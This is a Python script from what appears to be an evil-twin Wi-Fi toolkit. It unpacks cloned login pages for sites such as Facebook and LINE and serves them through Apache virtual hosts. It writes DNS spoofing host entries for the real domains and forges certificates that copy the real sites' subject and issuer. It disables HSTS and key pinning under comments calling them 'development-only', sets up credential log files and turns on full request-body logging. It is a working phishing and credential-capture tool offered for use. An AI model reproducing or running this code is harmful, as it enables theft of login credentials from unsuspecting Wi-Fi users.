#!/usr/bin/python3


import subprocess
import os 
from subprocess import PIPE
import argparse
import sys
import shutil
import re
import time
from zipfile import ZipFile


from OpenSSL import crypto
from cryptography.hazmat.primitives import serialization
from sys import argv, platform
from pathlib import Path
import shutil
import ssl
import os
import subprocess
import socket


R='\033[31m'
W='\033[0m'
Y="\033[1;33m"
Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+'/Snake_Package/ServerLog/'
Curent_dir2  ="".join(os.path.dirname(__file__)).replace("Snake_Package",'')
LOG_PATH = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package"
user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
with open(Path_St+'.web.txt','w') as file:
    group1  = "chown "+ user_name+ ":"+user_name +" "+  Path_St+".web.txt"
    os.system(group1)
with open (Path_St+'.Cread.txt','w') as Cread_User :
    group2  = "chown "+ user_name+ ":"+user_name +" "+  Path_St+".Cread.txt"
    os.system(group2)
with open (Path_St+'.pass.txt','w') as Cread_User :
    group3  = "chown "+ user_name+ ":"+user_name +" "+  Path_St+".pass.txt"
    os.system(group3)  

def Set_Log():             
    subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"],shell=True)
    subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/DNS_SPOOFING_LOG.py"],shell=True)
    command_run = Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"
    command_proc3 = ' gnome-terminal --geometry 110x30+1000+60  -e ' +'"' + command_run +'"'               
    call_termminal = subprocess.call(command_proc3,shell=True,stderr=subprocess.PIPE)
    if os.path.exists(Curent_dir2+"Snake_Package/ServerLog/LOGIN_DB.txt") :
       group  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"Snake_Package/ServerLog/LOGIN_DB.txt" 
       os.system(group)
    with open(Curent_dir2+'/WEB_AUTH_db.txt','a') as DB_PASS :
        group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"WEB_AUTH_db.txt" 
        os.system(group1)   
          
    os.makedirs('/var/www/html/wifi-notification',exist_ok=True)
    shutil.copy(LOG_PATH+'/resources/index.html', '/var/www/html/wifi-notification/')
    shutil.copy(LOG_PATH+'/resources/apple-success.html', '/var/www/html/wifi-notification/')
    shutil.copy(LOG_PATH+'/resources/wifi-notification.conf', '/etc/apache2/sites-available/')
    os.system("sudo touch /var/www/html/wifi-notification/generate_204")
    os.system('sudo chown -R www-data:www-data /var/www/html/wifi-notification')
    os.system('sudo chmod -R 755 /var/www/html/wifi-notification') 
   
class DNS_Spoofing:

        def __init__(self):
            self.parse_args()
            self.unzip_web()
            self.write_hosts()
            self.VirtualHost_files()       
            self.DNS_COPY_WEB()
        def DNS_COPY_WEB(self):
            try:
                if os.path.exists("/var/www/html/facebook"):
                   for folder in os.listdir(LOG_PATH+"/sites"):
                        remove_sites = 'sudo rm -r /var/www/html/'+f'{folder}'
                        os.system(remove_sites)
                        shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                        enable = "sudo a2ensite  "+f'{folder}'+" > /dev/null 2>&1"
                        os.system(enable) 
                       
                else:
                    for folder in os.listdir(LOG_PATH+"/sites"):
                        shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                        enable = "sudo a2ensite  "+f'{folder}'+"  >/dev/null 2>&1"
                        os.system(enable)
                command1 = 'sudo a2enmod dump_io >/dev/null 2>&1'
                subprocess.call(command1,shell=True,stderr=subprocess.PIPE)
                os.system("systemctl restart apache2 >/dev/null 2>&1")
                command = "sudo a2enmod dumpio >/dev/null 2>&1"
                subprocess.call(command,shell=True,stderr=subprocess.PIPE)    
                with open("/etc/apache2/ports.conf" ,'r') as portset :
                     port = portset.read()
                     if "172.160.255.49:80"  and "172.160.255.49:443"in port :
                         pass
                     else:  
                         with open(LOG_PATH+'/resources/ports_dns.txt' ,'r') as portset :  
                             port = portset.read()
                         with open ("/etc/apache2/ports.conf" ,'w') as portset :  
                              portset.write(port)  
                result = subprocess.run(["php", "-v"], capture_output=True, text=True, check=True)
                match = re.search(r"PHP (\d+\.\d+)", result.stdout)
                if match:
                    php_version = match.group(1)
                    check = subprocess.run(["sudo", "a2enmod" ,f"php{php_version}"], capture_output=True, text=True, check=True)
                    if "systemctl restart apache2" in check.stdout:
                        print(f"[+] Enabled PHP module: php{php_version}")

                os.system("sudo a2enmod ssl > /dev/null 2>&1")                     
                os.system("sudo a2dissite 000-default.conf >/dev/null 2>&1")
                os.system("sudo a2enmod rewrite >/dev/null 2>&1")  
                os.system("sudo a2enmod headers >/dev/null 2>&1")
                os.system("systemctl restart apache2 >/dev/null 2>&1")
                if os.system("sudo apache2ctl configtest >/dev/null 2>&1") == 0 :
                    print("[+] DNS has been Start")
                    print("[+] Apache2 Configuration Test  Syntax OK")
                else:
                    print("[+] Apache Configtest Get Error") 
                    print("[+] Run : journalctl -xeu apache2.service") 
                    exit()  
                
            except FileExistsError as r  :
                print("[+] error " ,r)
                exit()
        def Certificate_Self(self): 
            def Certificate_Process(): 
                port = 443
                ssl_dir.mkdir(parents=True, exist_ok=True)
                print("[+] SSL Certificate  File Directory Created")
                for domain in os.listdir(Path(LOG_PATH) / "sites"):
                    try:
                        if "bitconnect" in domain:
                            host =  f"www.{domain}.hosting"
                        elif "line" in domain:
                            host = f"www.{domain}.me" 
                        else:       
                            host = f"www.{domain}.com"
                        context = ssl.create_default_context()
                        print(f"{Y}[-] Fetch Certificate for {host}{W}")
                        sys.stdout.write('\x1b[1A')
                        sys.stdout.write('\x1b[2K')   
                        with socket.create_connection((host, port), timeout=5) as sock:
                            with context.wrap_socket(sock, server_hostname=host) as ssock:
                                cert_pem = ssl.DER_cert_to_PEM_cert(ssock.getpeercert(True))
                                Cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
                    except Exception:
                        print(f"{R}[-] Failed to fetch Certificate for {domain}{W}")
                        continue

                    OUTPUT = ssl_dir / f"{domain}.pem"
                    public_key = Cert.get_pubkey()
                    key_size = public_key.to_cryptography_key().key_size
                    if key_size < 2048:
                        key_size = 2048
                    key = crypto.PKey()
                    key.generate_key(crypto.TYPE_RSA, key_size)
                    Certificate = crypto.X509()
                    Certificate.set_version(Cert.get_version())
                    Certificate.set_serial_number(Cert.get_serial_number())
                    Certificate.set_subject(Cert.get_subject())
                    Certificate.set_issuer(Cert.get_issuer())
                    Certificate.set_notBefore(Cert.get_notBefore())
                    Certificate.set_notAfter(Cert.get_notAfter())
                    Certificate.set_pubkey(key)
                    Certificate.sign(key, 'sha256')
                    with open(OUTPUT, 'wb') as pem_file:
                        pem_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, Certificate))
                        pem_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))

                print("[+] SSL Certificate  Generated successfully.")

            ssl_dir = Path(LOG_PATH) / "SSLCertificate"
            if ssl_dir.exists() and not self.args.cert:
                print("[+] SSL Certificate  Directory Found")
            elif self.args.cert:
                Certificate_Process()
            else:
                Certificate_Process()        
        def VirtualHost_files(self):
            if os.path.exists(LOG_PATH+'/VirtualHostFile'):
                print("[+] VirtualHost File Found ")
            else:    
                os.makedirs(LOG_PATH+'/VirtualHostFile')
                print("[+] VirtualHost Folder has been Created ")
                for file in os.listdir(LOG_PATH+"/sites"):
                    with  open(LOG_PATH+'/VirtualHostFile/'+file+".conf",'w')as config :
                            config = config.write(
                            f"""
                            <VirtualHost 172.160.255.49:80>
                                    ServerAdmin {file}@{file}.local
                                    ServerName {file}.wifi
                                    ServerAlias www.{file}.wifi
                                    ServerAlias {file}.local
                                    ServerAlias www.{file}.local
                                    ServerAlias www.{file}.com
                                    ServerAlias www.{file}.me
                                    ServerAlias www.{file}.hosting
                                    ServerAlias {file}.com
                                    ServerAlias {file}.me
                                    ServerAlias {file}.hosting


                                    RewriteEngine On
                                    DocumentRoot /var/www/html/{file}
                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log 
                                    CustomLog {LOG_PATH}/ServerLog/log_access.log combined
                                    # Bypass security headers that might interfere with development
                                    Header always set Public-Key-Pins ""
                                    Header always set Expect-CT ""
                                    
                                    # Development-only headers
                                    Header always set X-Development-Mode "1"
                                    Header set Strict-Transport-Security "max-age=0; includeSubDomains; preload" env=HTTPS
                                    SSLProtocol all -SSLv3
                                    SSLCipherSuite HIGH:!aNULL:!MD5
                                    <IfModule dir_module>
                                            DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                            RewriteEngine On
                                            # Redirect ALL domains except {file}.wifi to www.{file}.wifi
                                            RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                            RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                             RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>
                                 
                                    DumpIOInput on
                                    DumpIOOutput on
                                    LogLevel dumpio:trace7

                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>

                            <VirtualHost 172.160.255.49:443>
                                    ServerName {file}.wifi
                                    ServerAlias www.{file}.wifi
                                    ServerAlias {file}.local
                                    ServerAlias www.{file}.local
                                    ServerAlias {file}.com
                                    ServerAlias www.{file}.com
                                    ServerAlias www.{file}.me
                                    ServerAlias www.{file}.hosting
                                    ServerAlias {file}.com
                                    ServerAlias {file}.me
                                    ServerAlias {file}.hosting


                                    DocumentRoot /var/www/html/{file}
                                    SSLEngine on
                                    SSLCertificateFile {LOG_PATH}/SSLCertificate/{file}.pem
                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificate/{file}.pem
                                    SSLCertificateChainFile {LOG_PATH}/SSLCertificate/{file}.pem

                                    # Bypass security headers that might interfere with development
                                    Header always set Public-Key-Pins ""
                                    Header always set Expect-CT ""
                                    
                                    # Development-only headers
                                    Header always set X-Development-Mode "1"
                                    Header set Strict-Transport-Security "max-age=0; includeSubDomains; preload" env=HTTPS
                                    SSLProtocol all -SSLv3
                                    SSLCipherSuite HIGH:!aNULL:!MD5

                                    ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
                                    CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
                                    <IfModule dir_module>
                                        DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                        RewriteEngine On
                                        # Redirect ALL HTTPS domains except {file}.wifi to HTTP www.{file}.wifi
                                        RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                        RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                        RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>
                                    DumpIOInput on
                                    DumpIOOutput on
                                    LogLevel dumpio:trace7
                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>
                            """
                        )
                try:
                    file_copy = 'sudo cp '+ LOG_PATH+'/VirtualHostFile/* /etc/apache2/sites-available/ '
                    copy_VirtualHost = os.system(file_copy)
                    print("[+] VirtualHost Files has been Created ")
                except FileExistsError as r :
                    print('[+] error',r)
                    exit()

        def write_hosts(self):
            if os.path.exists(LOG_PATH+'/resources/hosts.txt'):
               print("[+] Hosts dns Name List done ")
            else:
                with open(LOG_PATH+'/resources/hosts.txt','w') as hosts:
                    for host in os.listdir(LOG_PATH+"/sites"):  
                        with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:  
                            if "bitconnect" in host:
                                hosts.write(
                                    '172.160.255.49'.ljust(20) +  # Right-align IP
                                    ('www.' + host + '.local').ljust(25) +
                                    (host + '.local').ljust(22) +
                                    ('www.' + host + '.wifi').ljust(25) +
                                    (host + '.wifi').ljust(25) +
                                    (host + '.hosting').ljust(25) +
                                    ('www.' + host + '.hosting').ljust(25) +
                                    '\n'
                               )
                            elif "line" in host:
                                hosts.write(
                                    '172.160.255.49'.ljust(20) +  # Right-align IP
                                    ('www.' + host + '.local').ljust(25) +
                                    (host + '.local').ljust(22) +
                                    ('www.' + host + '.wifi').ljust(25) +
                                    (host + '.wifi').ljust(25) +
                                    (host + '.me').ljust(25) +
                                    ('www.' + host + '.me').ljust(25) +
                                    '\n'
                                )
                            else:
                                hosts.write(
                                        '172.160.255.49'.ljust(20) +  # Right-align IP
                                        ('www.' + host + '.local').ljust(25) +
                                        (host + '.local').ljust(22) +
                                        ('www.' + host + '.wifi').ljust(25) +
                                        (host + '.wifi').ljust(25) +
                                        (host + '.com').ljust(25) +
                                        ('www.' + host + '.com').ljust(25) +
                                        '\n'
                                    )

                    print("[+] Hosts dns resolve Name has be Created")
                 
        def unzip_web(self):
           
            if os.path.exists(Curent_dir2+'Snake_Package/sites'):
               Set_Log()
            else:
                hold_dir = os.path.join(Curent_dir2, 'Snake_Package/.Holddata')
                os.makedirs(hold_dir, exist_ok=True)
                with ZipFile(os.path.join(LOG_PATH, 'resources/sites1.zip'), 'r') as sites1, \
                    ZipFile(os.path.join(LOG_PATH, 'resources/sites2.zip'), 'r') as sites2,\
                    ZipFile(os.path.join(LOG_PATH, 'resources/sites3.zip'), 'r') as sites3:
                    sites1.extractall(path=hold_dir)
                    sites2.extractall(path=hold_dir)
                    sites3.extractall(path=hold_dir)
                web_dir = os.path.join(Curent_dir2, 'Snake_Package/sites')
                os.makedirs(web_dir, exist_ok=True)
                for folder_name in ['sites1', 'sites2','sites3']:
                    folder_path = os.path.join(hold_dir, folder_name)
                    if os.path.exists(folder_path):
                        for item in os.listdir(folder_path):
                            src = os.path.join(folder_path, item)
                            dst = os.path.join(web_dir, item)
                            if os.path.isdir(src):
                                shutil.copytree(src, dst, dirs_exist_ok=True)
                            else:
                                shutil.copy2(src, dst)

                shutil.rmtree(hold_dir)
                self.Certificate_Self()
                Set_Log()            
        def parse_args(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
            parser.add_argument( '-S ',"--Show",action='store_true')
            parser.add_argument( '-I ',"--Interface",action=None)                          
            parser.add_argument( '-AP ',"--APName",action=None)
            parser.add_argument( '-D ',"--Deauth",action=None)
            parser.add_argument( '-CP ',"--Portal",action='store_true')
            parser.add_argument( '-L ',"--List",action='store_true')
            parser.add_argument( '-T ',"--Target",action=None )
            parser.add_argument( '-P ',"--Packet",action=None ,type=int)
            parser.add_argument( '-cert' ,action='store_true')
            parser.add_argument( '--dns',action='store_true')
            
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
                 pass
            else:
                 parser.print_help()
                 exit()                
if __name__=='__main__':
     DNS_Spoofing()
'''
 config = config.write(
                            f"""
                            <VirtualHost 172.160.255.49:80>
                                    ServerAdmin {file}@{file}.local
                                    ServerName {file}.wifi
                                    ServerAlias *

                                    DocumentRoot /var/www/html/{file}
                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log
                                    CustomLog {LOG_PATH}/ServerLog/log_access.log combined
                                    <IfModule dir_module>
                                            DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                            RewriteEngine On
                                            # Redirect ALL domains except {file}.wifi to www.{file}.wifi
                                            RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                            RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                             RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>

                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>

                            <VirtualHost 172.160.255.49:443>
                                    ServerName {file}.wifi
                                    ServerAlias *
     

                                    DocumentRoot /var/www/html/{file}
                                    SSLEngine on
                                    SSLCertificate File {LOG_PATH}/SSLCertificate File/wildcard.crt
                                    SSLCertificate KeyFile {LOG_PATH}/SSLCertificate File/wildcard.key

                                    ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
                                    CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
                                    <IfModule dir_module>
                                        DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                        RewriteEngine On
                                        # Redirect ALL HTTPS domains except {file}.wifi to HTTP www.{file}.wifi
                                        RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                        RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                        RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>

                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>
                            """
                        )
'''                        